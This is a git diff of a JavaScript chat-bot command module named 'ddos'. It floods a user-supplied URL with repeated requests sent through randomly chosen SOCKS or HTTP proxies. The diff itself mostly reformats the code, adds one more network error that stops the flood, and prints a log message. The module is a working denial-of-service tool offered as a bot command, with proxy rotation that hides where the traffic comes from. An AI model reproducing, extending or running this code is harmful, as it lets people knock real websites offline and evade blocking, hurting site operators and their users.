@@ -3,7 +3,9 @@ const fs = require("fs");
 const path = require("path");
 const SocksProxyAgent = require("socks-proxy-agent");
 const HttpsProxyAgent = require("https-proxy-agent");
-const { rainbow } = require("gradient-string");
+const {
+    rainbow
+} = require("gradient-string");
 
 module.exports.config = {
     name: "ddos",
@@ -117,7 +119,8 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
         setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
     })
     .catch((err) => {
-        if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED' || err.code === 'EHOSTUNREACH' || err.code === 'ETIMEDOUT' || err.message === 'Socket is closed') {
+        if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED' || err.code === 'EHOSTUNREACH' || err.code === 'ETIMEDOUT' || err.code === "EAI_AGAIN" || err.message === 'Socket is closed') {
+            console.log(rainbow("Unable to Attack Target Server Refused!"));
             continueAttack = false;
         } else if (err.response?.status === 404) {
             console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
@@ -138,7 +141,11 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
 };
 
 
-module.exports.run = async ({ args, chat, font }) => {
+module.exports.run = async ({
+    args,
+    chat,
+    font
+}) => {
     const targetUrl = args[0];
 
     if (!targetUrl || !/^https?:\/\//.test(targetUrl)) {
@@ -171,9 +178,9 @@ module.exports.run = async ({ args, chat, font }) => {
 
         const randomProxy = getRandomElement(proxies);
         const proxyParts = randomProxy.split(":");
-        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
+        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5": "http";
         const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
-        const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
+        const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl): new HttpsProxyAgent(proxyUrl);
 
         performAttack(targetUrl, agent, continueAttack, requestsSent, checkCompletion);
     }
